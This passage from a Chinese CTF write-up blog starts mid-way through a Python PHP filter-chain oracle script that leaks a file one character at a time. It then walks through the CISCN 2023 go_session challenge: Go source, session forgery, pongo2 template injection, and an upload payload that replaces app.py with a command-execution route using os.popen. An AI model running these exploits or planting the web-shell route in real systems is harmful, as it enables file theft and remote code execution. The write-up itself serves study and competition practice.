class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;i&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># I J K</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;K&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;J&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;I&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># v w x</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;w&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;v&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># V W X</span></span><br><span class="line">		<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;W&#x27;</span></span><br><span class="line">		<span class="keyword">elif</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="subst">&#123;rot1&#125;</span>|string.rot13|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|<span class="subst">&#123;be&#125;</span>|<span class="subst">&#123;rot1&#125;</span>|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;V&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># Z</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># z</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;z&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># M</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;M&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># m</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;m&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># y</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;y&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># Y</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># l</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;l&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># L</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># h</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;h&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># H</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># u</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;u&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># U</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;U&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># g</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;g&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># G</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;G&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># t</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;t&#x27;</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="keyword">not</span> req(<span class="string">f&#x27;<span class="subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):</span><br><span class="line">		<span class="comment"># T</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;T&#x27;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>&#x27;</span></span><br><span class="line">	letter = find_letter(prefix)</span><br><span class="line">	<span class="comment"># it&#x27;s a number! check base64</span></span><br><span class="line">	<span class="keyword">if</span> letter == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">		prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span></span><br><span class="line">		s = find_letter(prefix)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">			<span class="comment"># 0 - 3</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> s == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">			<span class="comment"># 4 - 7</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;4&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;ijklmn&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;6&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;yz*&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;7&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> s == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">			<span class="comment"># 8 - 9</span></span><br><span class="line">			prefix = <span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="subst">&#123;r2&#125;</span>&#x27;</span></span><br><span class="line">			ss = find_letter(prefix)</span><br><span class="line">			<span class="keyword">if</span> ss <span class="keyword">in</span> <span class="string">&#x27;CDEFGH&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">			<span class="keyword">elif</span> ss <span class="keyword">in</span> <span class="string">&#x27;STUVWX&#x27;</span>:</span><br><span class="line">				letter = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				err(<span class="string">f&#x27;bad num (<span class="subst">&#123;ss&#125;</span>)&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			err(<span class="string">&#x27;wtf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(end=letter)</span><br><span class="line">	o += letter</span><br><span class="line">	sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">We are done!! :)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">d = b64decode(o.encode() + <span class="string">b&#x27;=&#x27;</span> * <span class="number">4</span>)</span><br><span class="line"><span class="comment"># remove KR padding</span></span><br><span class="line">d = d.replace(<span class="string">b&#x27;$)C&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(d))</span><br></pre></td></tr></table></figure>

<p>思路来源</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/05/08/Web%E4%BE%A7%E4%BF%A1%E9%81%93%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/">Webの侧信道初步认识 | Boogiepop Doesn’t Laugh (boogipop.com)</a></p>
</blockquote>
<h2 id="22-CISCN-2023-初赛-go-session-复现"><a href="#22-CISCN-2023-初赛-go-session-复现" class="headerlink" title="22.[CISCN 2023 初赛]go_session(复现)"></a>22.[CISCN 2023 初赛]go_session(复现)</h2><p>给了我们源码</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>源码信息如下：</p>
<p>1.访问tndex的路由，如果没有session值的携带，会自动给我们赋值成guest</p>
<p>2.admin路由，对我们的session进行一次检测，然后如果为guset就返回no，如果是admin的值就将我们输入的name参数作为输出。</p>
<p>这里使用的html.EscapeString(）将输入的name值的进行html转义，这里可能存在ssti的问题</p>
<p>flask路由上跑了一个flask的服务</p>
<p>resp, err :&#x3D; http.Get(“<a target="_blank" rel="noopener" href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>“ + c.DefaultQuery(“name”, “guest”))</p>
<p>传值的时候需要使用</p>
<p>?name&#x3D;%3fname&#x3D;123</p>
<h3 id="伪造session提权为admin"><a href="#伪造session提权为admin" class="headerlink" title="伪造session提权为admin"></a>伪造session提权为admin</h3><p>题目中没有给我session的key值</p>
<p>直接猜测服务器的key值是空</p>
<p>在本地搭建go网页，获取session-name</p>
<h3 id="ssti注入"><a href="#ssti注入" class="headerlink" title="ssti注入"></a>ssti注入</h3><p>这里是go的后端，存在pongo的注入</p>
<p>在django的注入中</p>
<p>Admin(c *gin.Context)，将输入的值传递给pongo2.Context{“c”: c}</p>
<p>这里存在可能的ssti，</p>
<p>在tags的文档里面看到可以使用{ % % }包裹目标的play去注入</p>
<p>gin框架呢存在一个referce的参数可控，request的host属性可以控制，这里可以使用referce去获取host报头里面的refer属性</p>
<p>然后转入到Admin（）内存在模板注入</p>
<h3 id="flask热调试"><a href="#flask热调试" class="headerlink" title="flask热调试"></a>flask热调试</h3><p>在提权为admin之后，访问flask路由，随便传参让他报错</p>
<p>发现app.py 的路由，然后开启的debug</p>
<p>可以通过上传文件的方式覆盖app.py进行命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;n&quot;</span>; filename=<span class="string">&quot;1.py&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: text/plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>使用go 的saveuploadfile方法去储存上传文件</p>
<p> { {c.SaveUploadedFile(c.FormFile(“file”),”&#x2F;app&#x2F;server.py”) } }</p>
<p>但是这里的“”被过滤了</p>
<p>使用Context.HandlerName()函数去截取</p>
<p>此函数可以返还主处理函数的名称</p>
<p>使用c.HandlerName()|last),去获取“file”字符串</p>
